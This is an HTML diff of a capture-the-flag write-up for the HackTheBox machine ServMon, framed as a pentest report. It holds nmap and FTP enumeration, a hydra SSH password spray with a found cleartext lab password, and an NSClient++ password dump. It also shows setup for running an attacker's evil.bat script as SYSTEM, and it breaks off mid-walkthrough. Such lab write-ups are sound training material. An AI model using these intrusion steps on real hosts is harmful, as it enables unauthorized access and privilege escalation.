@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <!-- 
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+                -->
+            </div>
+
+            <!--testing-->
+            <div class="rightsidebar">
+                <div class="title-container">
+                    <img src="../images/icons/htb_icon.png" alt="Icon" class="title-icon">
+                    <h2 class="title">ServMon</h2>
+                </div>
+                
+                <img src="../images/Posts/ServMon/Servmon.png" alt="" class="right-machineimage">
+
+                <ul class="navbar">
+                    <h1>Table of Contents</h1>
+                    <li><a href="#Statement-of-Confidentiality">1. Statement of Confidentiality</a></li>
+                    <li><a href="#Executive-Summary">2. Executive Summary</a></li>
+                    <ul>
+                        <li><a href="#Approach">2.1 Approach</a></li>
+                        <li><a href="#Scope">2.2 Scope</a></li>
+                        <li><a href="#Assessment-Overview-and-Recommendations">2.3 Assessment Overview and Recommendations</a></li>
+                    </ul>
+                    <li><a href="#Netwok-Penetration-Test-Assesment-Summary">3. Netwok Penetration Test Assesment Summary</a></li>
+                    <ul>
+                        <li><a href="#Summary-of-Findings">3.1 Summary of Findings</a></li>
+                    </ul>
+                    <li><a href="#Internal-Network-Compromise-Walkthrough">4. Internal Network Compromise Walkthrough</a></li>
+                    <ul>
+                        <li><a href="#Enumeration">4.1 Enumeration</a></li>
+                        <li><a href="#Foothold">4.2 Foothold</a></li>
+                        <li><a href="#Privilege-Escalation">4.3 Privilege Escalation</a></li>
+                    </ul>
+                    <li><a href="#Technical-Findings-Details">5. Technical Findings Details</a></li>
+                    <li><a href="#Conclusion">6. Conclusion</a></li>
+                </ul>
+            </div>
+            <!--testing-->
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>ServMon WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/ServMon/ServMon_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <div class="table-contents">
+                        <h1>Table of Contents</h1>
+                        <ul>
+                            <li><a href="#Statement-of-Confidentiality">1. Statement of Confidentiality</a></li>
+                            <li><a href="#Executive-Summary">2. Executive Summary</a></li>
+                            <ul>
+                                <li><a href="#Approach">2.1 Approach</a></li>
+                                <li><a href="#Scope">2.2 Scope</a></li>
+                                <li><a href="#Assessment-Overview-and-Recommendations">2.3 Assessment Overview and Recommendations</a></li>
+                            </ul>
+                            <li><a href="#Netwok-Penetration-Test-Assesment-Summary">3. Netwok Penetration Test Assesment Summary</a></li>
+                            <ul>
+                                <li><a href="#Summary-of-Findings">3.1 Summary of Findings</a></li>
+                            </ul>
+                            <li><a href="#Internal-Network-Compromise-Walkthrough">4. Internal Network Compromise Walkthrough</a></li>
+                            <ul>
+                                <li><a href="#Enumeration">4.1 Enumeration</a></li>
+                                <li><a href="#Foothold">4.2 Foothold</a></li>
+                                <li><a href="#Privilege-Escalation">4.3 Privilege Escalation</a></li>
+                            </ul>
+                            <li><a href="#Technical-Findings-Details">5. Technical Findings Details</a></li>
+                            <li><a href="#Conclusion">6. Conclusion</a></li>
+                        </ul>
+                    </div>
+
+                    <div id="Statement-of-Confidentiality">
+                        <h1>1. Statement of Confidentiality</h1>
+                        <p>The information contained in this document is exclusive to ServMon. This report must not be used, duplicated or disclosed to third parties without the express consent of ServMon. Any violation of this confidentiality may have legal consequences.</p>
+                    </div>
+                    
+                    <div id="Executive-Summary">
+                        <h1>2. Executive Summary</h1>
+                        <p>We were engaged by ServMon to perform a penetration test of ServMon's internal network to identify security weaknesses, determine the impact on ServMon, document all findings in a clear and repeatable manner, and provide remediation recommendations.</p>
+                    </div>
+                    
+                    <div id="Approach">
+                        <h2>2.1 Approach:</h2>
+                        <p>The assessment was conducted using a “<i>black box</i>” approach between `<strong>13/12/2024</strong>` and `<strong>14/12/2024</strong>`, without any credentials or prior knowledge of ServMon’s internal environment. The primary purpose was to identify potential unknown vulnerabilities. Testing was performed in a non-intrusive manner, seeking to uncover misconfigurations and security weaknesses. The process was performed remotely from a host dedicated exclusively to this assessment. Each identified vulnerability was documented and manually examined to assess its exploitation potential and escalation possibilities. An effort was made to demonstrate the full impact of each vulnerability, up to the point of compromising the internal network if possible.</p>
+                    </div>
+                    
+                    <div id="Scope">
+                        <h2>2.2 Scope:</h2>
+                        <p>The assessment focused on an internal network range:</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Host/URL/IP Adress</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>10.129.54.213</td>
+                                    <td>servmon.htb</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 1: Scope Details</p>
+                    </div>
+
+                    <div id="Assessment-Overview-and-Recommendations">
+                        <h2>2.3 Assessment Overview and Recommendations:</h2>
+                        <p>During the internal penetration test against ServMon, three critical vulnerabilities were identified that affect the confidentiality, integrity, and availability of the information system. These findings were classified according to their level of severity (based on the vulnerability rating). Among the problems detected, it was found that a protocol was misconfigured, allowing anonymous authentication. This makes it possible for unauthorized users to access the system, enumerate its components, and even upload malicious files, putting the integrity of the system at risk. Regarding web services, it was found that outdated versions and insecure configurations are running, which opens the door to known vulnerabilities. An attacker could exploit them to obtain internal information or execute arbitrary commands, potentially compromising the entire system.</p>
+                    </div>
+
+                    <div id="Netwok-Penetration-Test-Assesment-Summary">
+                        <h1>3. Netwok Penetration Test Assesment Summary</h1>
+                        <p>All testing activities were started from the perspective of an unauthenticated user on the internal network. ServMon provided the network ranges, but no additional information such as operating system or configuration information was provided.</p>
+                    </div>
+                    
+                    <div id="Summary-of-Findings">
+                        <h1>3.1 Summary of Findings</h1>
+                        <p>During the course of testing, a total of three (3) findings were discovered that pose a material risk to ServMon systems. The following table provides a summary of the findings by severity level.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th colspan="3">Finding Severity</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-level">
+                                    <td>High</td>
+                                    <td>Critical</td>
+                                    <td>Total</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-level-num">
+                                    <td id="red">2</td>
+                                    <td id="red">1</td>
+                                    <td>3</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 2: Severity Summary</p>
+                        <p>Below is an overview of each finding identified during testing. These findings are discussed in depth in the <a href="#Technical-Findings-Details">Technical Findings Details</a> section of this report.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Finding #</th>
+                                    <th>Severity Level</th>
+                                    <th>Finding Name</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>1.</td>
+                                    <td id="red">Critical</td>
+                                    <td>Privilege escalation in NSClient++</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>2.</td>
+                                    <td id="red">High</td>
+                                    <td>NSClient++ Remote Authentication</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>3.</td>
+                                    <td id="red">High</td>
+                                    <td>Directory Traversal in NVMS-1000</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 3: Finding List</p>
+                    </div>
+
+                    <div id="Internal-Network-Compromise-Walkthrough">
+                        <h1>4. Internal Network Compromise Walkthrough</h1>
+                    </div>
+                    
+                    <div id="Enumeration">
+                        <h1>4.1 Enumeration</h1>
+                        <h3>Nmap</h3>
+                        <p>Initial scan for open ports:</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -v -n -Pn -p- 10.129.227.77                   
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 07:15 EST
+Initiating SYN Stealth Scan at 07:15
+Scanning 10.129.227.77 [65535 ports]
+Discovered open port 22/tcp on 10.129.227.77
+Discovered open port 80/tcp on 10.129.227.77
+Discovered open port 445/tcp on 10.129.227.77
+Discovered open port 135/tcp on 10.129.227.77
+Discovered open port 21/tcp on 10.129.227.77
+Discovered open port 139/tcp on 10.129.227.77
+Discovered open port 8443/tcp on 10.129.227.77
+Discovered open port 49664/tcp on 10.129.227.77
+Discovered open port 49666/tcp on 10.129.227.77
+Discovered open port 49670/tcp on 10.129.227.77
+Discovered open port 6699/tcp on 10.129.227.77
+Discovered open port 49667/tcp on 10.129.227.77
+Discovered open port 49668/tcp on 10.129.227.77
+Discovered open port 5666/tcp on 10.129.227.77
+Discovered open port 49669/tcp on 10.129.227.77
+Discovered open port 6063/tcp on 10.129.227.77
+Discovered open port 49665/tcp on 10.129.227.77
+Completed SYN Stealth Scan at 07:15, 33.50s elapsed (65535 total ports)
+Nmap scan report for 10.129.227.77
+Host is up (0.035s latency).
+Not shown: 65518 closed tcp ports (reset)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5666/tcp  open  nrpe
+6063/tcp  open  x11
+6699/tcp  open  napster
+8443/tcp  open  https-alt
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 33.56 seconds
+           Raw packets sent: 65679 (2.890MB) | Rcvd: 65535 (2.621MB)                                
+                            </pre>
+                        </div>
+                        <p>We discovered the following most interesting open ports:</p>
+                        <div class="info-box">
+                            <ul>
+                                <li><strong>21/tcp</strong>: ftp</li>
+                                <li><strong>22/tcp</strong>: ssh</li>
+                                <li><strong>80/tcp</strong>: http</li>
+                                <li><strong>8443/tcp</strong>: https-alt</li>
+                            </ul>
+                        </div>
+                        <p>We proceed with service version enumeration and run NSE scripts to gather information about potential service vulnerabilities or configurations.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -v -n -Pn -sCV -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.129.227.77 -oN scan.txt
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 07:58 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 07:58
+.
+.
+.
+&lt;SNAP>
+.
+.
+.
+Nmap scan report for 10.129.227.77
+Host is up (0.035s latency).
+
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_02-28-22  06:35PM       &lt;DIR>          Users
+22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
+|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
+|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
+80/tcp    open  http
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html).
+|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 200 OK
+|     Content-type: text/html
+|     Content-Length: 340
+|     Connection: close
+|     AuthInfo: 
+|     &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+|     &lt;html xmlns="http://www.w3.org/1999/xhtml">
+|     &lt;head>
+|     &lt;title>&lt;/title>
+|     &lt;script type="text/javascript">
+|     window.location.href = "Pages/login.htm";
+|     &lt;/script>
+|     &lt;/head>
+|     &lt;body>
+|     &lt;/body>
+|     &lt;/html>
+|   X11Probe: 
+|     HTTP/1.1 408 Request Timeout
+|     Content-type: text/html
+|     Content-Length: 0
+|     Connection: close
+|_    AuthInfo:
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5666/tcp  open  tcpwrapped
+6063/tcp  open  tcpwrapped
+6699/tcp  open  napster?
+8443/tcp  open  ssl/https-alt
+|_ssl-date: TLS randomness does not represent time
+| http-methods: 
+|_  Supported Methods: GET
+| http-title: NSClient++
+|_Requested resource was /index.html
+| fingerprint-strings: 
+|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     HTTP/1.1 404
+|     Content-Length: 18
+|     Document not found
+|   GetRequest: 
+|     HTTP/1.1 302
+|     Content-Length: 0
+|     Location: /index.html
+|     workers
+|_    jobs
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2020-01-14T13:24:20
+| Not valid after:  2021-01-13T13:24:20
+| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
+|_SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+.
+.
+.
+&lt;SNAP>
+.
+.
+.
+Nmap done: 1 IP address (1 host up) scanned in 134.95 seconds
+           Raw packets sent: 17 (748B) | Rcvd: 17 (748B)
+                            </pre>
+                        </div>
+                        <p>From the previous result we extract the versions and services:</p>
+                        <div class="info-box">
+                            <ul>
+                                <li><strong>ftp</strong>: Microsoft ftpd</li>
+                                <li><strong>ssh</strong>: OpenSSH for_Windows_8.0 (protocol 2.0)</li>
+                                <li><strong>http</strong>: ?</li>
+                                <li><strong>https-alt</strong>: NSClient++</li>
+                            </ul>
+                        </div>
+                        <h3>FTP</h3>
+                        <p>Since anonymous access to the ftp service is allowed, we access the service and list the available files:</p>
+                        <div class="console-code">
+                            <pre>
+$ ftp 10.129.227.77 
+Connected to 10.129.227.77.
+220 Microsoft FTP Service
+Name (10.129.227.77:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> 
+                            </pre>
+                        </div>
+                        <p>We found the folders of two users:</p>
+                        <div class="console-code">
+                            <pre>
+ftp> dir
+229 Entering Extended Passive Mode (|||49680|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:35PM       &lt;DIR>          Users
+226 Transfer complete.
+ftp> cd Users
+250 CWD command successful.
+ftp> dir
+229 Entering Extended Passive Mode (|||49682|)
+150 Opening ASCII mode data connection.
+02-28-22  06:36PM       &lt;DIR>          Nadine
+02-28-22  06:37PM       &lt;DIR>          Nathan
+226 Transfer complete.
+ftp>
+                            </pre>
+                        </div>
+                        <p>Inside the folders, we find two files, one in each user folder and download both files</p>
+                        <div class="console-code">
+                            <pre>
+ftp> cd Nadine
+ftp> dir
+229 Entering Extended Passive Mode (|||49684|)
+150 Opening ASCII mode data connection.
+02-28-22  06:36PM                  168 Confidential.txt
+226 Transfer complete.
+ftp> get Confidential.txt
+local: Confidential.txt remote: Confidential.txt
+229 Entering Extended Passive Mode (|||49686|)
+125 Data connection already open; Transfer starting.
+100% |**********************************************|   168        4.80 KiB/s    00:00 ETA
+226 Transfer complete.
+
+ftp> cd Nathan
+ftp> dir
+229 Entering Extended Passive Mode (|||49687|)
+150 Opening ASCII mode data connection.
+02-28-22  06:36PM                  182 Notes to do.txt
+226 Transfer complete.
+ftp> get Notes\ to\ do.txt
+local: Notes to do.txt remote: Notes to do.txt
+229 Entering Extended Passive Mode (|||49689|)
+125 Data connection already open; Transfer starting.
+100% |**********************************************|   182        5.08 KiB/s    00:00 ETA
+226 Transfer complete.
+                            </pre>
+                        </div>
+                        <p>We read the downloaded files.</p>
+                        <div class="console-code">
+                            <pre>
+$ cat Confidential.txt 
+Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it 
+yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+                            </pre>
+                        </div>
+                        <div class="console-code">
+                            <pre>
+cat 'Notes to do.txt'                                                                      
+1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+                            </pre>
+                        </div>
+                        <p>In Nadine's file she talks about a Passwords.txt file that is on Nathan's desktop. In Nathan's file there is a list of things to do.</p>
+                        <p>Regarding the latter one, we have some clues about a software called NVMS and that it seems that public access to certain files has not yet been removed.</p>
+                        <h3>HTTP / HTTPS</h3>
+                        <p>We visit the web page that is running on port 80 and find a login for a service called NVMS-1000.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/1.png" alt="">
+                            <p class="caption">Web service home page</p>
+                        </div>
+                        <p>We tried the default software credentials `<i>admin:123456</i>` but with no success.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/2.png" alt="">
+                        </div>
+                        <p>We visited the web page on port 8443 and found NSClient++ running. It seems that the only thing we can do on this site is try to log in. We tried some default credentials but it doesn't work.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/3.png" alt="">
+                        </div>
+                        <p>Clicking Forgotten password? gives us a way to get the password, but it seems to be used only internally.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/4.png" alt="">
+                        </div>
+                    </div>
+
+                    <div id="Foothold">
+                        <h2>4.2 Foothold</h2>
+                        <p>Using searchsploit we searched to see if any of these software have any associated vulnerabilities and found that there is a directory traversal vulnerability in NVMS-1000.</p>
+                        <div class="console-code">
+                            <pre>
+searchsploit NVMS 1000         
+--------------------------------------------------------------- ----------------------------
+ Exploit Title                                                 |  Path
+--------------------------------------------------------------- ----------------------------
+NVMS 1000 - Directory Traversal                                | hardware/webapps/47774.txt
+TVT NVMS 1000 - Directory Traversal                            | hardware/webapps/48311.py
+--------------------------------------------------------------- ----------------------------
+Shellcodes: No Results
+                            </pre>
+                        </div>
+                        <p>We read the file content and it seems easy to exploit. To try to exploit the vulnerability we will use Burpsuite.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/5.png" alt="">
+                        </div>
+                        <p>We open Burpsuite and intercept the login request:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/6.png" alt="">
+                        </div>
+                        <p>We send the request to the repeater, modify the path and send the request. It works!</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/7.png" alt="">
+                        </div>
+                        <p>Since we have the ability to read system files, we tried to read the Passwords.txt file that Nadine mentioned and found a small password dictionary.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/8.png" alt="">
+                        </div>
+                        <p>Since we have two possible users: "nadine" and "nathan" and some passwords, we will try to do password sprying against SSH port 22 with the hydra tool.</p>
+                        <div class="console-code">
+                            <pre>
+$ hydra -L users.txt -P passwords.txt ssh://10.129.227.77
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-13 09:00:29
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:3/p:7), ~2 tries per task
+[DATA] attacking ssh://10.129.227.77:22/
+[22][ssh] host: 10.129.227.77   login: nadine   password: L1k3B1gBut7s@W0rk
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-13 09:00:31
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/9.png" alt="">
+                        </div>
+                        <p>So we have valid credentials. We connect via <strong>ssh</strong> with the credentials of the user `<strong>nadine</strong>` with the command: `<strong>ssh nadine@10.129.227.77</strong>` and the password previously found it.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/10.png" alt="">
+                        </div>
+                    </div>
+                    
+                    <div id="Privilege-Escalation">
+                        <h2>4.3 Privilege Escalation</h2>
+                        <p>Enumerating the system we find the folder where the <strong>NSClient++</strong> software we saw earlier is installed <i>C:\Program Files\NSClient++</i>. We use the previous command we discovered to display the password.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/11.png" alt="">
+                        </div>
+                        <div class="console-code">
+                            <pre>
+nadine@SERVMON C:\Program Files\NSClient++>dir 
+ Volume in drive C has no label. 
+ Volume Serial Number is 20C1-47A1
+
+ Directory of C:\Program Files\NSClient++
+
+02/28/2022  06:55 PM    &lt;DIR>          .
+02/28/2022  06:55 PM    &lt;DIR>          ..
+12/09/2015  12:17 AM            28,672 boost_chrono-vc110-mt-1_58.dll
+12/09/2015  12:17 AM            50,688 boost_date_time-vc110-mt-1_58.dll
+&lt;SNAP>
+12/13/2024  07:49 AM             2,800 nsclient.ini
+12/13/2024  07:49 AM            40,561 nsclient.log
+11/05/2017  09:42 PM            55,808 NSCP.Core.dll
+01/28/2018  10:32 PM         4,765,208 nscp.exe
+11/05/2017  09:42 PM           483,328 NSCP.Protobuf.dll
+&lt;SNAP>
+05/23/2015  07:44 AM           689,664 unicodedata.pyd
+02/28/2022  06:55 PM    &lt;DIR>          web
+11/05/2017  09:20 PM         1,273,856 where_filter.dll
+05/23/2015  07:44 AM            47,616 _socket.pyd
+              33 File(s)     53,144,676 bytes
+               7 Dir(s)   6,084,923,392 bytes free
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/12.png" alt="">
+                        </div>
+                        <div class="console-code">
+                            <pre>
+nadine@SERVMON C:\Program Files\NSClient++>nscp.exe web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/13.png" alt="">
+                        </div>
+                        <p>Using the `<strong>--help</strong>` flag we discover that we can see the software version with a command.</p>
+                        <div class="console-code">
+                            <pre>
+nadine@SERVMON C:\Program Files\NSClient++>nscp.exe --help
+Allowed options: 
+
+Common options:
+  --settings arg                Override (temporarily) settings subsystem to
+                                use 
+  --debug                       Set log level to debug (and show debug
+                                information) 
+  --log arg                     The log level to use
+  --define arg                  Defines to use to override settings. Syntax is
+                                PATH:KEY=VALUE 
+
+Common options:
+  --help                        Show the help message for a given command
+  --no-stderr                   Do not report errors on stderr 
+  --version                     Show version information
+
+Service Options:
+  --install                     Install service 
+  --uninstall                   Uninstall service
+  --start                       Start service 
+  --stop                        Stop service
+  --restart                     Stop than start service 
+  --info                        Show information about service
+  --run                         Run as a service 
+  --name arg                    Name of service 
+  --description arg             Description of service
+.
+.
+.
+&lt;SNAP>
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/14.png" alt="">
+                        </div>
+                        <p>We use `<strong>nscp.exe --version</strong>` to see the version.</p>
+                        <div class="console-code">
+                            <pre>
+nadine@SERVMON C:\Program Files\NSClient++>nscp.exe --version
+NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/15.png" alt="">
+                        </div>
+                        <p>With the searchsploit tool we look for any vulnerability and find a Privilege Escalation vulnerability.</p>
+                        <div class="console-code">
+                            <pre>
+searchsploit NSClient++ 0.5.2.35          
+------------------------------------------------------------ -------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ -------------------------
+NSClient++ 0.5.2.35 - Authenticated Remote Code Execution   | json/webapps/48360.txt
+NSClient++ 0.5.2.35 - Privilege Escalation                  | windows/local/46802.txt
+NSClient++ 0.5.2.35 - Privilege Escalation                  | windows/local/46802.txt
+------------------------------------------------------------ -------------------------
+Shellcodes: No Results
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/16.png" alt="">
+                        </div>
+                        <p>After reading the <a href="https://www.exploit-db.com/exploits/46802" target="_blank">exploit</a>, we discovered that a low-privileged user has the ability to read the web service administrator password in clear text (as we already discovered) in order to then be able to authenticate and make configuration changes on the server. The authenticated user can enable modules to check for external scripts and schedule their execution. There don't seem to be any restrictions on where the scripts are invoked from, so the user can create the script anywhere. Since the <strong>NSClient++</strong> service runs as local system, these scheduled scripts are executed as that user and the low-privileged user can gain privilege escalation.</p>
+                        <p>When trying to log in we get an error saying that we are not allowed to authenticate. This may be because authentication will only be allowed from "<strong>inside</strong>" the system. We can solve this by doing a <strong>Local Port Forwarding</strong> to our machine to have access to port 8443 from "<strong>inside</strong>".</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/17.png" alt="">
+                        </div>
+                        <p>`<strong>ssh -L 9000:127.0.0.1:8443 nadine@10.129.227.77</strong>`, with this command our port <strong>9000</strong> will <strong>be</strong> locally the port <strong>8443</strong> of the target machine. We try to log in with the found password, it works and we are in.</p>
+                        <p>Once inside we go to the Modules tab and enable "ExternalScripts" and "Scheduler".</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/18.png" alt="">
+                            <img src="../images/Posts/ServMon/19.png" alt="">
+                        </div>
+                        <p>Now we configure and add a new script: <strong>settings > settings > external scripts > scripts > add new</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/20.png" alt="">
+                        </div>
+                        <p>We create the folder C:\temp</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/21.png" alt="">
+                        </div>
+                        <p>Back to the web we name: <strong>section</strong>: `<i>/settings/external scripts/scripts/test</i>`, <strong>Key</strong>: command and <strong>Value</strong>: `c:\temp\evil.bat`</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/22.png" alt="">
+                        </div>
+                        <p>To save the changes made, click on "<strong>changes > save changes</strong>" then "<strong>control > reload</strong>".</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/23.png" alt="">
+                        </div>
+                        <p>We wait for it to restart, we go to the <strong>Queries</strong> tab and we would have our script added.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/24.png" alt="">
+                        </div>
+                        <p>We will try to see if we can ping to us. We create the <strong>evil.bat</strong> file with the ping command inside. `<strong>echo ping -n 1 10.10.14.60 > evil.bat</strong>`.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/25.png" alt="">
+                        </div>
+                        <p>We listen with tcpdump on our machine.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+                            </pre>
+                        </div>
+                        <p>Returning to the web we click on test.</p>
+                        <div class="writeup-image">
